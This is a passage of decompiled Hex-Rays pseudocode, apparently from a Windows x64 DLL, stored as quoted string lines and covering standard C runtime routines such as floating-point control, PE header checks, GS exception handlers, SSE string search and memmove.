    "  unsigned int v9; // edi",
    "  XSAVE_FORMAT *v10; // rbx",
    "  int v11; // r15d",
    "  unsigned int v12; // r8d",
    "  int v13; // eax",
    "  void *v14; // rax",
    "  DWORD LastError; // eax",
    "  int v16; // eax",
    "",
    "  v6 = sub_1800294D0(a1, 0, 1u);",
    "  v7 = sub_1800294D0(a1, 0, 2u);",
    "  v8 = a2.QuadPart - v7.QuadPart;",
    "  if ( v6.QuadPart == -1 || v7.QuadPart == -1 )",
    "  {",
    "    if ( *(_BYTE *)(a3 + 48) )",
    "      v16 = *(_DWORD *)(a3 + 44);",
    "    else",
    "      v16 = 22;",
    "    v9 = v16;",
    "  }",
    "  else",
    "  {",
    "    v9 = 0;",
    "    if ( v8 <= 0 )",
    "    {",
    "      if ( v8 < 0 )",
    "      {",
    "        if ( sub_1800294D0(a1, a2, 0) == -1 )",
    "        {",
    "          if ( *(_BYTE *)(a3 + 48) )",
    "            v9 = *(_DWORD *)(a3 + 44);",
    "        }",
    "        else",
    "        {",
    "          v14 = (void *)sub_18002E4C8(a1);",
    "          if ( !SetEndOfFile(v14) )",
    "          {",
    "            LastError = GetLastError();",
    "            *(_BYTE *)(a3 + 56) = 1;",
    "            v9 = 13;",
    "            *(_DWORD *)(a3 + 52) = LastError;",
    "            *(_BYTE *)(a3 + 48) = 1;",
    "            *(_DWORD *)(a3 + 44) = 13;",
    "          }",
    "        }",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v10 = (XSAVE_FORMAT *)sub_1800232FC(0x1000u, 1u);",
    "      if ( v10 )",
    "      {",
    "        v11 = sub_180035290(a1, 0x8000);",
    "        while ( 1 )",
    "        {",
    "          v12 = v8;",
    "          if ( v8 >= 4096 )",
    "            v12 = 4096;",
    "          v13 = sub_180028F58(a1, v10, v12, a3);",
    "          if ( v13 == -1 )",
    "            break;",
    "          v8 -= v13;",
    "          if ( v8 <= 0 )",
    "          {",
    "            sub_180035290(a1, v11);",
    "            goto LABEL_17;",
    "          }",
    "        }",
    "        if ( *(_BYTE *)(a3 + 56) && *(_DWORD *)(a3 + 52) == 5 )",
    "        {",
    "          *(_BYTE *)(a3 + 48) = 1;",
    "          *(_DWORD *)(a3 + 44) = 13;",
    "        }",
    "        if ( *(_BYTE *)(a3 + 48) )",
    "          v9 = *(_DWORD *)(a3 + 44);",
    "      }",
    "      else",
    "      {",
    "        v9 = 12;",
    "        *(_BYTE *)(a3 + 48) = 1;",
    "        *(_DWORD *)(a3 + 44) = 12;",
    "      }",
    "LABEL_17:",
    "      sub_180023374(v10);",
    "    }",
    "  }",
    "  sub_1800294D0(a1, v6, 0);",
    "  return v9;",
    "}",
    "",
    "",
    "int __fastcall sub_1800355A0(__int64 a1, DWORD a2, __m128i *a3, int a4, WCHAR *a5, int a6)",
    "{",
    "  unsigned int v6; // ebx",
    "  unsigned int v10; // eax",
    "  bool v11; // sf",
    "  bool v12; // of",
    "",
    "  v6 = a4;",
    "  if ( a4 > 0 )",
    "  {",
    "    v10 = sub_180021E08(a3, a4);",
    "    v12 = __OFSUB__(v10, v6);",
    "    v11 = (int)(v10 - v6) < 0;",
    "    v6 = v10 + 1;",
    "    if ( v11 == v12 )",
    "      v6 = v10;",
    "  }",
    "  return sub_1800239D0(a1, a2, (const WCHAR *)a3, v6, a5, a6, 0, 0, 0);",
    "}",
    "",
    "",
    "__int64 sub_180035628()",
    "{",
    "  char fpsr; // bl",
    "  unsigned int v1; // r9d",
    "  int v2; // r8d",
    "  int v3; // ecx",
    "  int v4; // edx",
    "",
    "  fpsr = get_fpsr();",
    "  fclrf();",
    "  v1 = 0;",
    "  if ( (fpsr & 0x3F) != 0 )",
    "  {",
    "    v2 = (16 * (fpsr & 1)) | 8;",
    "    if ( (fpsr & 4) == 0 )",
    "      v2 = 16 * (fpsr & 1);",
    "    v3 = v2 | 4;",
    "    if ( (fpsr & 8) == 0 )",
    "      v3 = v2;",
    "    v4 = v3 | 2;",
    "    if ( (fpsr & 0x10) == 0 )",
    "      v4 = v3;",
    "    v1 = v4 | 1;",
    "    if ( (fpsr & 0x20) == 0 )",
    "      v1 = v4;",
    "    if ( (fpsr & 2) != 0 )",
    "      v1 |= 0x80000u;",
    "  }",
    "  return v1;",
    "}",
    "",
    "",
    "// attributes: thunk",
    "__int64 __fastcall sub_180035694(__int64 a1, __int64 a2)",
    "{",
    "}__int64 __fastcall sub_18003569C(int a1, int a2)",
    "{",
    "  int v3; // r12d",
    "  unsigned int fpsr; // eax",
    "  __int16 v5; // r10",
    "  int v6; // edx",
    "  int v7; // ecx",
    "  int v8; // edx",
    "  int v9; // ecx",
    "  unsigned int v10; // edx",
    "  int v11; // eax",
    "  int v12; // r10d",
    "  int v13; // r10d",
    "  int v14; // r8d",
    "  int v15; // edx",
    "  int v16; // ecx",
    "  int v17; // edx",
    "  int v18; // ecx",
    "  unsigned int v19; // ebx",
    "  int v20; // eax",
    "  int v21; // r8d",
    "  int v22; // edx",
    "  int v23; // ecx",
    "  int v24; // edx",
    "  int v25; // ecx",
    "  int v26; // eax",
    "  int v27; // ebx",
    "  int v28; // ebx",
    "",
    "  v3 = a2 & 0x308031F;",
    "  fpsr = get_fpsr();",
    "  v5 = fpsr;",
    "  v6 = (fpsr >> 3) & 0x10 | 8;",
    "  if ( (fpsr & 0x200) == 0 )",
    "    v6 = (fpsr >> 3) & 0x10;",
    "  v7 = v6 | 4;",
    "  if ( (fpsr & 0x400) == 0 )",
    "    v7 = v6;",
    "  v8 = v7 | 2;",
    "  if ( (fpsr & 0x800) == 0 )",
    "    v8 = v7;",
    "  v9 = v8 | 1;",
    "  if ( (fpsr & 0x1000) == 0 )",
    "    v9 = v8;",
    "  v10 = v9 | 0x80000;",
    "  if ( (fpsr & 0x100) == 0 )",
    "    v10 = v9;",
    "  v11 = fpsr & 0x6000;",
    "  if ( v11 )",
    "  {",
    "    switch ( v11 )",
    "    {",
    "      case 8192:",
    "        v10 |= 0x100u;",
    "        break;",
    "      case 16384:",
    "        v10 |= 0x200u;",
    "        break;",
    "      case 24576:",
    "        v10 |= 0x300u;",
    "        break;",
    "    }",
    "  }",
    "  v12 = (v5 & 0x8040) - 64;",
    "  if ( v12 )",
    "  {",
    "    v13 = v12 - 32704;",
    "    if ( v13 )",
    "    {",
    "      if ( v13 == 64 )",
    "        v10 |= 0x1000000u;",
    "    }",
    "    else",
    "    {",
    "      v10 |= 0x3000000u;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v10 |= 0x2000000u;",
    "  }",
    "  v14 = v3 & a1 | v10 & ~v3;",
    "  if ( v14 != v10 )",
    "  {",
    "    v15 = (8 * (v14 & 0x10)) | 0x200;",
    "    if ( (v14 & 8) == 0 )",
    "      v15 = 8 * (v14 & 0x10);",
    "    v16 = v15 | 0x400;",
    "    if ( (v14 & 4) == 0 )",
    "      v16 = v15;",
    "    v17 = v16 | 0x800;",
    "    if ( (v14 & 2) == 0 )",
    "      v17 = v16;",
    "    v18 = v17 | 0x1000;",
    "    if ( (v14 & 1) == 0 )",
    "      v18 = v17;",
    "    v19 = v18 | 0x100;",
    "    if ( (v14 & 0x80000) == 0 )",
    "      v19 = v18;",
    "    v20 = v14 & 0x300;",
    "    if ( (v14 & 0x300) != 0 )",
    "    {",
    "      switch ( v20 )",
    "      {",
    "        case 256:",
    "          v19 |= 0x2000u;",
    "          break;",
    "        case 512:",
    "          v19 |= 0x4000u;",
    "          break;",
    "        case 768:",
    "          v19 |= 0x6000u;",
    "          break;",
    "      }",
    "    }",
    "    v21 = v14 & 0x3000000;",
    "    switch ( v21 )",
    "    {",
    "      case 16777216:",
    "        v19 |= 0x8040u;",
    "        break;",
    "      case 33554432:",
    "        v19 |= 0x40u;",
    "        break;",
    "      case 50331648:",
    "        v19 |= 0x8000u;",
    "        break;",
    "    }",
    "    if ( byte_18004BCA8 && (v19 & 0x40) != 0 )",
    "    {",
    "      set_fpsr(v19);",
    "    }",
    "    else",
    "    {",
    "      v19 &= ~0x40u;",
    "      set_fpsr(v19);",
    "    }",
    "    v22 = (v19 >> 3) & 0x10 | 8;",
    "    if ( (v19 & 0x200) == 0 )",
    "      v22 = (v19 >> 3) & 0x10;",
    "    v23 = v22 | 4;",
    "    if ( (v19 & 0x400) == 0 )",
    "      v23 = v22;",
    "    v24 = v23 | 2;",
    "    if ( (v19 & 0x800) == 0 )",
    "      v24 = v23;",
    "    v25 = v24 | 1;",
    "    if ( (v19 & 0x1000) == 0 )",
    "      v25 = v24;",
    "    v10 = v25 | 0x80000;",
    "    if ( (v19 & 0x100) == 0 )",
    "      v10 = v25;",
    "    v26 = v19 & 0x6000;",
    "    if ( (v19 & 0x6000) != 0 )",
    "    {",
    "      switch ( v26 )",
    "      {",
    "        case 8192:",
    "          v10 |= 0x100u;",
    "          break;",
    "        case 16384:",
    "          v10 |= 0x200u;",
    "          break;",
    "        case 24576:",
    "          v10 |= 0x300u;",
    "          break;",
    "      }",
    "    }",
    "    v27 = (v19 & 0x8040) - 64;",
    "    if ( v27 )",
    "    {",
    "      v28 = v27 - 32704;",
    "      if ( v28 )",
    "      {",
    "        if ( v28 == 64 )",
    "          v10 |= 0x1000000u;",
    "      }",
    "      else",
    "      {",
    "        v10 |= 0x3000000u;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v10 |= 0x2000000u;",
    "    }",
    "  }",
    "  return v10;",
    "}",
    "",
    "",
    "double __fastcall sub_180035938(int a1, __int64 a2, __int64 a3, double a4, __int64 a5, double a6, __int64 a7)",
    "{",
    "  int v9; // [rsp+20h] [rbp-38h] BYREF",
    "  __int64 v10; // [rsp+28h] [rbp-30h]",
    "  double v11; // [rsp+30h] [rbp-28h]",
    "  __int64 v12; // [rsp+38h] [rbp-20h]",
    "  double v13; // [rsp+40h] [rbp-18h]",
    "",
    "  v9 = a1;",
    "  v12 = a5;",
    "  v13 = a6;",
    "  v11 = a4;",
    "  v10 = a3;",
    "  ctrlfp(a7, 65472);",
    "  if ( !(unsigned int)sub_18002DE4C((__int64)&v9) )",
    "    sub_1800247D8(a1);",
    "  return v13;",
    "}",
    "",
    "",
    "_BOOL8 __fastcall sub_1800359A0(char a1, __int16 a2)",
    "{",
    "  int v3; // ebx",
    "",
    "  v3 = a1 & 0x1F;",
    "  if ( (a1 & 8) != 0 && (a2 & 0x80u) != 0 )",
    "  {",
    "    set_statfp(1);",
    "    v3 &= ~8u;",
    "  }",
    "  else if ( (a1 & 4) != 0 && (a2 & 0x200) != 0 )",
    "  {",
    "    set_statfp(4);",
    "    v3 &= ~4u;",
    "  }",
    "  else if ( (a1 & 1) != 0 && (a2 & 0x400) != 0 )",
    "  {",
    "    set_statfp(8);",
    "    v3 &= ~1u;",
    "  }",
    "  else if ( (a1 & 2) != 0 && (a2 & 0x800) != 0 )",
    "  {",
    "    if ( (a1 & 0x10) != 0 )",
    "      set_statfp(16);",
    "    v3 &= ~2u;",
    "  }",
    "  if ( (a1 & 0x10) != 0 && (a2 & 0x1000) != 0 )",
    "  {",
    "    set_statfp(32);",
    "    v3 &= ~0x10u;",
    "  }",
    "  return v3 == 0;",
    "}",
    "",
    "",
    "double __fastcall sub_180035A5C(",
    "        __int64 a1,",
    "        int a2,",
    "        __int64 a3,",
    "        int a4,",
    "        int a5,",
    "        unsigned int a6,",
    "        double a7,",
    "        __int64 a8,",
    "        __int64 a9)",
    "{",
    "  BOOL v13; // eax",
    "  __int64 v14; // xmm6_8",
    "  double v16; // [rsp+48h] [rbp-91h] BYREF",
    "  __int64 v17; // [rsp+50h] [rbp-89h] BYREF",
    "  _QWORD v18[8]; // [rsp+58h] [rbp-81h] BYREF",
    "  unsigned int v19; // [rsp+98h] [rbp-41h]",
    "",
    "  v17 = ctrlfp(8064, 65472);",
    "  *(_QWORD *)&v16 = a3;",
    "  v13 = sub_1800359A0(a5, v17);",
    "  v14 = a8;",
    "  if ( !v13 )",
    "  {",
    "    if ( (_DWORD)a9 == 2 )",
    "    {",
    "      v18[6] = a8;",
    "      v19 = v19 & 0xFFFFFFE0 | 3;",
    "    }",
    "    raise_exc((int)v18, (int)&v17, a5, a2, (__int64)&a7, (__int64)&v16);",
    "  }",
    "  if ( sub_18002DE24() && a4 )",
    "    return sub_180035938(a4, a6, a1, a7, v14, v16, v17);",
    "  sub_1800247D8(a4);",
    "  ctrlfp(v17, 65472);",
    "  return v16;",
    "}",
    "",
    "",
    "__int64 sub_180035BA0()",
    "{",
    "  int v0; // r8d",
    "",
    "  v0 = 0;",
    "  dword_18004DE34 = 0;",
    "  _RAX = 1;",
    "  __asm { cpuid }",
    "  if ( (_RCX & 0x18001000) == 0x18001000 )",
    "  {",
    "    __asm { xgetbv }",
    "    v0 = dword_18004DE34;",
    "  }",
    "  dword_18004DE38 = v0;",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180035C10(int a1, int a2, int a3)",
    "{",
    "  return sub_180035C30(a1, a2, a3, 27, (__int64)\"log10\");",
    "}",
    "",
    "",
    "// local variable allocation has failed, the output may be wrong!",
    "__m128 __fastcall sub_180035C30(double a1, double a2, int a3, int a4, __int64 a5)",
    "{",
    "}__int64 __fastcall IsNonwritableInCurrentImage(__int64 a1)",
    "{",
    "  __int64 result; // rax",
    "",
    "  result = sub_180035D90(0x180000000uLL);",
    "  if ( (_DWORD)result )",
    "  {",
    "    result = sub_180035CF0(0x180000000uLL, a1 - 0x180000000LL);",
    "    if ( result )",
    "      return *(int *)(result + 36) >= 0;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "_BOOL8 __fastcall sub_180035D90(__int64 a1)",
    "{",
    "  __int64 v1; // rdx",
    "",
    "  if ( *(_WORD *)a1 == 23117 && (v1 = a1 + *(int *)(a1 + 60), *(_DWORD *)v1 == 17744) )",
    "    return *(_WORD *)(v1 + 24) == 523;",
    "  else",
    "    return 0;",
    "}",
    "",
    "",
    "EXCEPTION_DISPOSITION __fastcall _GSHandlerCheck_SEH(",
    "        struct #70 *ExceptionRecord,",
    "        void *EstablisherFrame,",
    "        struct #55 *ContextRecord,",
    "        struct _DISPATCHER_CONTEXT *DispatcherContext)",
    "{",
    "  char *v8; // rbx",
    "  EXCEPTION_DISPOSITION result; // eax",
    "",
    "  v8 = (char *)DispatcherContext->HandlerData + 16 * *(unsigned int *)DispatcherContext->HandlerData;",
    "  _GSHandlerCheckCommon((__int64)EstablisherFrame, (__int64)DispatcherContext);",
    "  result = ExceptionContinueSearch;",
    "  if ( ((((*((_DWORD *)ExceptionRecord + 1) & 0x66) != 0) + 1) & *((_DWORD *)v8 + 1)) != 0 )",
    "    return _C_specific_handler(ExceptionRecord, EstablisherFrame, ContextRecord, DispatcherContext);",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall _GSHandlerCheck_EH(__int64 a1, __int64 a2, __int64 a3, __int64 a4)",
    "{",
    "  __int64 v4; // rbx",
    "  __int64 result; // rax",
    "",
    "  v4 = *(_QWORD *)(a4 + 56);",
    "  _GSHandlerCheckCommon(a2, a4);",
    "  result = 1;",
    "  if ( ((((*(_DWORD *)(a1 + 4) & 0x66) != 0) + 1) & *(_DWORD *)(v4 + 4)) != 0 )",
    "    return _CxxFrameHandler3(a1, a2, a3, a4);",
    "  return result;",
    "}",
    "",
    "",
    "void __fastcall sub_180035EC4(void *a1, void *a2)",
    "{",
    "  RtlUnwind(a1, a2, 0, 0);",
    "}",
    "",
    "",
    "EXCEPTION_DISPOSITION __fastcall _C_specific_handler_noexcept(",
    "        __int64 a1,",
    "        void *a2,",
    "        struct #55 *a3,",
    "        struct _DISPATCHER_CONTEXT *a4)",
    "{",
    "  EXCEPTION_DISPOSITION result; // eax",
    "  __int64 v7; // rcx",
    "  __int64 v8; // rcx",
    "",
    "  result = _C_specific_handler((struct #70 *)a1, a2, a3, a4);",
    "  if ( (*(_BYTE *)(a1 + 4) & 0x66) == 0 && *(_DWORD *)a1 == -529697949 && result == ExceptionContinueSearch )",
    "  {",
    "    *(_QWORD *)(sub_180013A9C(v7) + 32) = a1;",
    "    *(_QWORD *)(sub_180013A9C(v8) + 40) = a3;",
    "    sub_1800230F8();",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__m128i *__fastcall sub_180035F3C(__m128i *a1, unsigned __int8 a2)",
    "{",
    "  __m128i *v2; // r9",
    "  __m128i *v3; // r8",
    "  __m128i *v4; // rdx",
    "  __int64 v5; // rax",
    "  __m128i *v7; // r11",
    "  int v8; // r10d",
    "  __m128i v9; // xmm2",
    "  unsigned int v10; // edx",
    "  int i; // ebx",
    "  __int64 v12; // rcx",
    "  __m128i *v13; // rcx",
    "  unsigned int v14; // edx",
    "  __int64 v15; // rcx",
    "  __int8 *v16; // rcx",
    "  __m128i v17; // xmm0",
    "  unsigned __int8 v18; // zf",
    "  int v19; // ecx",
    "",
    "  v2 = 0;",
    "  v3 = a1;",
    "  if ( a2 )",
    "  {",
    "    if ( dword_18004B0D0 >= 2 )",
    "    {",
    "      while ( ((unsigned __int8)v3 & 0xF) != 0 )",
    "      {",
    "        if ( v3->m128i_i8[0] == a2 )",
    "          v2 = v3;",
    "        if ( !v3->m128i_i8[0] )",
    "          return v2;",
    "        v3 = (__m128i *)((char *)v3 + 1);",
    "      }",
    "      v17 = _mm_cvtsi32_si128(a2);",
    "      while ( 1 )",
    "      {",
    "        v19 = _mm_cmpistri(v17, *v3, 64);",
    "        v18 = _mm_cmpistrz(v17, *v3, 64);",
    "        if ( _mm_cmpistrc(v17, *v3, 64) )",
    "        {",
    "          v2 = (__m128i *)((char *)v3 + v19);",
    "          v18 = _mm_cmpistrz(v17, *v3, 64);",
    "        }",
    "        if ( v18 )",
    "          break;",
    "        ++v3;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v7 = (__m128i *)((unsigned __int64)a1 & 0xFFFFFFFFFFFFFFF0uLL);",
    "      v8 = -1 << ((unsigned __int8)a1 & 0xF);",
    "      v9 = _mm_shuffle_epi32(_mm_shufflelo_epi16(_mm_cvtsi32_si128(a2 | (a2 << 8)), 0), 0);",
    "      v10 = v8 & _mm_movemask_epi8(_mm_cmpeq_epi8(v9, *(__m128i *)((unsigned __int64)a1 & 0xFFFFFFFFFFFFFFF0uLL)));",
    "      for ( i = v8",
    "              & _mm_movemask_epi8(_mm_cmpeq_epi8((__m128i)0LL, *(__m128i *)((unsigned __int64)a1 & 0xFFFFFFFFFFFFFFF0uLL)));",
    "            !i;",
    "            v10 = _mm_movemask_epi8(_mm_cmpeq_epi8(v9, *v7)) )",
    "      {",
    "        _BitScanReverse((unsigned int *)&v12, v10);",
    "        v13 = (__m128i *)((char *)v7 + v12);",
    "        if ( v10 )",
    "          v2 = v13;",
    "        i = _mm_movemask_epi8(_mm_cmpeq_epi8((__m128i)0LL, *++v7));",
    "      }",
    "      v14 = ((i & -i) - 1) & v10;",
    "      _BitScanReverse((unsigned int *)&v15, v14);",
    "      v16 = &v7->m128i_i8[v15];",
    "      if ( v14 )",
    "        return (__m128i *)v16;",
    "    }",
    "    return v2;",
    "  }",
    "  else",
    "  {",
    "    v4 = (__m128i *)((unsigned __int64)a1 & 0xFFFFFFFFFFFFFFF0uLL);",
    "    for ( LODWORD(v5) = (-1 << ((unsigned __int8)a1 & 0xF))",
    "                      & _mm_movemask_epi8(_mm_cmpeq_epi8((__m128i)0LL, *(__m128i *)((unsigned __int64)a1",
    "                                                                                  & 0xFFFFFFFFFFFFFFF0uLL)));",
    "          !(_DWORD)v5;",
    "          LODWORD(v5) = _mm_movemask_epi8(_mm_cmpeq_epi8((__m128i)0LL, *v4)) )",
    "    {",
    "      ++v4;",
    "    }",
    "    _BitScanForward((unsigned int *)&v5, v5);",
    "    return (__m128i *)((char *)v4 + v5);",
    "  }",
    "}",
    "",
    "",
    "const __m128i *__fastcall sub_180036074(const __m128i *a1, unsigned __int16 a2)",
    "{",
    "  __int64 v3; // r9",
    "  __m128i v4; // xmm2",
    "  __m128i v5; // xmm0",
    "  unsigned int v6; // eax",
    "  __int64 v7; // rax",
    "  __int64 v8; // rcx",
    "  _WORD *v9; // r8",
    "",
    "  v3 = 0;",
    "  v4 = _mm_shuffle_epi32(_mm_shufflelo_epi16(_mm_cvtsi32_si128(a2), 0), 0);",
    "  while ( ((unsigned __int16)a1 & 0xFFFu) > 0xFF0uLL )",
    "  {",
    "    if ( a1->m128i_i16[0] == a2 )",
    "      return a1;",
    "    if ( !a1->m128i_i16[0] )",
    "      return 0;",
    "    v7 = 2;",
    "LABEL_8:",
    "    a1 = (const __m128i *)((char *)a1 + v7);",
    "  }",
    "  v5 = _mm_loadu_si128(a1);",
    "  v6 = _mm_movemask_epi8((__m128i)_mm_or_ps((__m128)_mm_cmpeq_epi16((__m128i)0LL, v5), (__m128)_mm_cmpeq_epi16(v5, v4)));",
    "  if ( !v6 )",
    "  {",
    "    v7 = 16;",
    "    goto LABEL_8;",
    "  }",
    "  _BitScanForward((unsigned int *)&v8, v6);",
    "  v9 = (__int16 *)((char *)a1->m128i_i16 + v8);",
    "  if ( *v9 == a2 )",
    "    return (const __m128i *)v9;",
    "  return (const __m128i *)v3;",
    "}",
    "",
    "",
    "void __fastcall sub_180036150(void *a1, const void *a2, unsigned __int64 a3)",
    "{",
    "  qmemcpy(a1, a2, a3);",
    "}",
    "",
    "",
    "void __fastcall sub_180036160(__m128i *_RCX, const __m128i *_RDX, unsigned __int64 _R8)",
    "{",
    "  __int32 v4; // ecx",
    "  __int16 v5; // r9",
    "  __int8 v6; // r10",
    "  __int16 v7; // cx",
    "  __int8 v8; // r9",
    "  __int16 v9; // r8",
    "  __int8 v10; // r9",
    "  __int32 v11; // ecx",
    "  __int16 v12; // r9",
    "  __int8 v13; // r8",
    "  __int32 v14; // ecx",
    "  __int8 v15; // r9",
    "  __int16 v16; // cx",
    "  __int8 v17; // cl",
    "  __int32 v18; // ecx",
    "  __int16 v19; // r8",
    "  __int8 v20; // r8",
    "  __m128i v21; // xmm2",
    "  __m128i *v22; // r9",
    "  __int64 v25; // r9",
    "  __m128i v58; // xmm0",
    "  __m128i v59; // xmm5",
    "  __int64 v60; // r9",
    "  __m128i v61; // xmm2",
    "  __m128i v62; // xmm3",
    "  __m128i v63; // xmm4",
    "  __m128i v64; // xmm2",
    "  __m128i v65; // xmm3",
    "  __m128i v66; // xmm4",
    "  unsigned __int64 v67; // r9",
    "  __m128i v68; // xmm2",
    "  signed __int64 v69; // rdx",
    "  __int8 *v70; // rcx",
    "  __int128 v71; // xmm0",
    "  unsigned __int64 v72; // rcx",
    "  unsigned __int64 v73; // r8",
    "  _OWORD *v74; // r9",
    "  __int128 v75; // xmm1",
    "  unsigned __int64 v76; // r9",
    "  __int128 v77; // xmm0",
    "  __int128 v78; // xmm1",
    "  __int128 v79; // xmm1",
    "  __int128 v80; // xmm1",
    "  __int128 v81; // xmm0",
    "  __int128 v82; // xmm1",
    "  unsigned __int64 i; // r9",
    "",
    "  _RAX = _RCX;",
    "  switch ( _R8 )",
    "  {",
    "    case 0uLL:",
    "      return;",
    "    case 1uLL:",
    "      _RCX->m128i_i8[0] = _RDX->m128i_i8[0];",
    "      return;",
    "    case 2uLL:",
    "      _RCX->m128i_i16[0] = _RDX->m128i_i16[0];",
    "      return;",
    "    case 3uLL:",
    "      v13 = _RDX->m128i_i8[2];",
    "      _RCX->m128i_i16[0] = _RDX->m128i_i16[0];",
    "      _RCX->m128i_i8[2] = v13;",
    "      return;",
    "    case 4uLL:",
    "      _RCX->m128i_i32[0] = _RDX->m128i_i32[0];",
    "      return;",
    "    case 5uLL:",
    "      v20 = _RDX->m128i_i8[4];",
    "      _RCX->m128i_i32[0] = _RDX->m128i_i32[0];",
    "      _RCX->m128i_i8[4] = v20;",
    "      return;",
    "    case 6uLL:",
    "      v19 = _RDX->m128i_i16[2];",
    "      _RCX->m128i_i32[0] = _RDX->m128i_i32[0];",
    "      _RCX->m128i_i16[2] = v19;",
    "      return;",
    "    case 7uLL:",
    "      v9 = _RDX->m128i_i16[2];",
    "      v10 = _RDX->m128i_i8[6];",
    "      _RCX->m128i_i32[0] = _RDX->m128i_i32[0];",
    "      _RCX->m128i_i16[2] = v9;",
    "      _RCX->m128i_i8[6] = v10;",
    "      return;",
    "    case 8uLL:",
    "      _RCX->m128i_i64[0] = _RDX->m128i_i64[0];",
    "      return;",
    "    case 9uLL:",
    "      v17 = _RDX->m128i_i8[8];",
    "      _RAX->m128i_i64[0] = _RDX->m128i_i64[0];",
    "      _RAX->m128i_i8[8] = v17;",
    "      return;",
    "    case 0xAuLL:",
    "      v16 = _RDX->m128i_i16[4];",
    "      _RAX->m128i_i64[0] = _RDX->m128i_i64[0];",
    "      _RAX->m128i_i16[4] = v16;",
    "      return;",
    "    case 0xBuLL:",
    "      v7 = _RDX->m128i_i16[4];",
    "      v8 = _RDX->m128i_i8[10];",
    "      _RAX->m128i_i64[0] = _RDX->m128i_i64[0];",
    "      _RAX->m128i_i16[4] = v7;",
    "      _RAX->m128i_i8[10] = v8;",
    "      return;",
    "    case 0xCuLL:",
    "      v18 = _RDX->m128i_i32[2];",
    "      _RAX->m128i_i64[0] = _RDX->m128i_i64[0];",
    "      _RAX->m128i_i32[2] = v18;",
    "      return;",
    "    case 0xDuLL:",
    "      v14 = _RDX->m128i_i32[2];",
    "      v15 = _RDX->m128i_i8[12];",
    "      _RAX->m128i_i64[0] = _RDX->m128i_i64[0];",
    "      _RAX->m128i_i32[2] = v14;",
    "      _RAX->m128i_i8[12] = v15;",
    "      return;",
    "    case 0xEuLL:",
    "      v11 = _RDX->m128i_i32[2];",
    "      v12 = _RDX->m128i_i16[6];",
    "      _RAX->m128i_i64[0] = _RDX->m128i_i64[0];",
    "      _RAX->m128i_i32[2] = v11;",
    "      _RAX->m128i_i16[6] = v12;",
    "      return;",
    "    case 0xFuLL:",
    "      v4 = _RDX->m128i_i32[2];",
    "      v5 = _RDX->m128i_i16[6];",
    "      v6 = _RDX->m128i_i8[14];",
    "      _RAX->m128i_i64[0] = _RDX->m128i_i64[0];",
    "      _RAX->m128i_i32[2] = v4;",
    "      _RAX->m128i_i16[6] = v5;",
    "      _RAX->m128i_i8[14] = v6;",
    "      return;",
    "    default:",
    "      if ( _R8 <= 0x20 )",
    "      {",
    "        v21 = _mm_loadu_si128((const __m128i *)((char *)_RDX + _R8 - 16));",
    "        *_RCX = _mm_loadu_si128(_RDX);",
    "        *(__m128i *)((char *)&_RCX[-1] + _R8) = v21;",
    "        return;",
    "      }",
    "      v22 = (__m128i *)((char *)_RDX + _R8);",
    "      if ( _RCX <= _RDX )",
    "        v22 = _RCX;",
    "      if ( _RCX < v22 )",
    "      {",
    "        v68 = *_RDX;",
    "        v69 = (char *)_RDX - (char *)_RCX;",
    "        v70 = &_RCX->m128i_i8[_R8];",
    "        v71 = *(_OWORD *)&v70[v69 - 16];",
    "        v72 = (unsigned __int64)(v70 - 16);",
    "        v73 = _R8 - 16;",
    "        if ( (v72 & 0xF) != 0 )",
    "        {",
    "          v74 = (_OWORD *)v72;",
    "          v72 &= 0xFFFFFFFFFFFFFFF0uLL;",
    "          v75 = v71;",
    "          v71 = *(_OWORD *)(v72 + v69);",
    "          *v74 = v75;",
    "          v73 = v72 - (_QWORD)_RAX;",
    "        }",
    "        v76 = v73 >> 7;",
    "        if ( v73 >> 7 )",
    "        {",
    "          for ( *(_OWORD *)v72 = v71; ; *(_OWORD *)v72 = v82 )",
    "          {",
    "            v77 = *(_OWORD *)(v72 + v69 - 16);",
    "            v78 = *(_OWORD *)(v72 + v69 - 32);",
    "            v72 -= 128LL;",
    "            *(_OWORD *)(v72 + 112) = v77;",
    "            *(_OWORD *)(v72 + 96) = v78;",
    "            v79 = *(_OWORD *)(v72 + v69 + 64);",
    "            --v76;",
    "            *(_OWORD *)(v72 + 80) = *(_OWORD *)(v72 + v69 + 80);",
    "            *(_OWORD *)(v72 + 64) = v79;",
    "            v80 = *(_OWORD *)(v72 + v69 + 32);",
    "            *(_OWORD *)(v72 + 48) = *(_OWORD *)(v72 + v69 + 48);",
    "            *(_OWORD *)(v72 + 32) = v80;",
    "            v81 = *(_OWORD *)(v72 + v69 + 16);",
    "            v82 = *(_OWORD *)(v72 + v69);",
    "            if ( !v76 )",
    "              break;",
    "            *(_OWORD *)(v72 + 16) = v81;",
    "          }",
    "          *(_OWORD *)(v72 + 16) = v81;",
    "          v73 &= 0x7Fu;",
    "          v71 = v82;",
    "        }",
    "        for ( i = v73 >> 4; i; --i )",
    "        {",
    "          *(_OWORD *)v72 = v71;",
    "          v72 -= 16LL;",
    "          v71 = *(_OWORD *)(v72 + v69);",
    "        }",
    "        if ( (v73 & 0xF) != 0 )",
    "          *_RAX = v68;",
    "        *(_OWORD *)v72 = v71;",
    "        return;",
    "      }",
    "      if ( (unsigned int)dword_18004B0D0 < 3 )",
    "      {",
    "        if ( _R8 <= 0x800 || (dword_18004CBCC & 2) == 0 )",
    "        {",
    "          v58 = _mm_loadu_si128(_RDX);",
    "          v59 = _mm_loadu_si128((const __m128i *)((char *)_RDX + _R8 - 16));",
    "          if ( _R8 > 0x80 )",
    "          {",
    "            v60 = ((unsigned __int8)_RCX & 0xF) - 16LL;",
    "            _RCX = (__m128i *)((char *)_RCX - v60);",
    "            _RDX = (const __m128i *)((char *)_RDX - v60);",
    "            _R8 += v60;",
    "            if ( _R8 > 0x80 )",
    "            {",
    "              do",
    "              {",
    "                v61 = _mm_loadu_si128(_RDX + 1);",
    "                v62 = _mm_loadu_si128(_RDX + 2);",
    "                v63 = _mm_loadu_si128(_RDX + 3);",
    "                *_RCX = _mm_loadu_si128(_RDX);",
    "                _RCX[1] = v61;",
    "                _RCX[2] = v62;",
    "                _RCX[3] = v63;",
    "                v64 = _mm_loadu_si128(_RDX + 5);",
